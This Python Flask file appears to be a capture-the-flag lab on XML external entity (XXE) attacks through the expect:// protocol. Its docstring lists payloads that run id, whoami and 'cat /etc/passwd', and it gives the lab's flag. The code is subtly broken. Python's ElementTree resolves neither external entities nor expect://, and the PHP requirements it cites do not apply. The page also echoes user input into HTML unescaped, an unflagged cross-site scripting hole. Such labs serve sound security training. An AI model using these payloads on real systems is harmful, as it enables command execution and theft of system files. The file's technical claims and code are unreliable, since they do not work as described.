"""
XXE Lab 13: XXE with Expect Protocol
Difficulty: 3 (Advanced)
Points: 100

Description:
XXE using expect protocol for command execution.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: XXE with expect protocol
    
    Attack Vector:
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
    <foo>&xxe;</foo>
    
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
    <foo>&xxe;</foo>
    
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">]>
    <foo>&xxe;</foo>
    
    Note: Requires allow_url_fopen and expect extension enabled in PHP
    Python lxml library may also support this
    
    Flag: FLAG{xxe_expect_protocol_013}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>XXE Expect Protocol</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5013, debug=False)
